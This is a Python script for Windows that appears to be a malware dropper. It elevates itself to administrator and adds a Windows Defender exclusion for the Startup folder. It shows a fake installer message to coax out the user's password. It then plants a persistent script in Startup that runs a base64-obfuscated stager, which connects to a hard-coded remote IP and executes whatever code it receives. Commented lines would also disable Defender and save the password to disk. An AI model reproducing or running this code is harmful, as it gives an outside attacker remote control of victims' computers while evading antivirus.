import os
import ctypes, sys
import subprocess
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
        F = """

import os
import urllib.request, string, random, struct, time, ssl, ctypes as LWaDKVvcgwiajEA
import ctypes
import sys

while True:
    try:
        #os.system('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f')
            #CODE HERE (with one identation)
        def toRun():
            #CODE HERE
            exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzgxLjg0LjE4NC4xNzgnLDU1NDQzKSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShkKSkseydzJzpzfSkK')[0]))
            #END MS CODE

        while True:
            try:
                toRun()
            except:
                pass
            time.sleep(3)
    except:
        try:
            toRun()
        except:
            pass
"""
        username = os.getlogin()
        #os.system('REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f')
        #h = open("iasditu1239fakjs.py","w")
        #h.write(J)
        #h.close()
        g = """
import os
import time
while True:
    try:
        pass
    except:
        pass
    time.sleep(30)

"""
        p = open('gjqw2398dfask42.pyw','w')
        p.write(g)
        p.close()
        #password = input('Insira a sua palavra-passe do windows: ')

        #subprocess.call(['runas', f'/user:{username}', fr'powershell -Command Add-MpPreference -ExclusionPath  "C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"'])
        print('Please Insert the Windows password below, the letters you type will not be shown for privacy reasons')
        print("Don't Worry your data is safe, we only need it to sign the packages for the installation process")
        subprocess.call(['runas', f'/user:{username}', fr'powershell -Command Add-MpPreference -ExclusionPath "C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"'])
        #os.system(fr'powershell $password={password} -Command Add-MpPreference -ExclusionPath  "C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"')

        #o = open(fr'C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\p.txt','w')
        #o.write(password)
        #o.close()
        l = open(fr'C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\temp.pyw',"w")
        l.write(F)
        l.close()
        #os.system(fr'COPY "iasditu1239fakjs.bat" "C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"')
        os.system(fr'COPY "gjqw2398dfask42.pyw" "C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"')
        os.system('cls')

        #os.system(rf'python "C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\gjqw2398dfask42.pyw"')
        os.system(rf'python "C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\temp.pyw"')
        #os.system('python temp.pyw')


else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

         
